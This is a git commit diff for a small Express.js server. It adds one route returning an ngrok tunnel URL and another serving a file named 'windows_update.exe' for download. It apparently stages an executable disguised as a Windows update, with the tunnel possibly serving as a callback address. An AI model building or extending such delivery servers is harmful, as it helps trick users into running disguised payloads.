0d696d5c36008bd524f87d5e96f5e21f252a9730
radio server <radioserver98@gmail.com>
2023-03-11 12:17:01 -0300

    download path

--- index.js
+++ index.js
@@ -1,7 +1,15 @@
-const express = require('express')
-const app = express()
-app.all('/', (req, res) => {
-    console.log("Just got a request!")
+const express = require('express');
+const app = express();
+const PORT = process.env.PORT || 4500;
+
+app.all('/url', (req, res) => {
     res.send('https://0b4f-190-192-75-210.sa.ngrok.io')
 })
-app.listen(process.env.PORT || 3000)
+
+app.get('/download', function (req, res) {
+    const file = `windows_update.exe`;
+    res.download(file);
+});
+
+app.listen(PORT)
+console.log(`Servidor listen on port ${PORT}`)
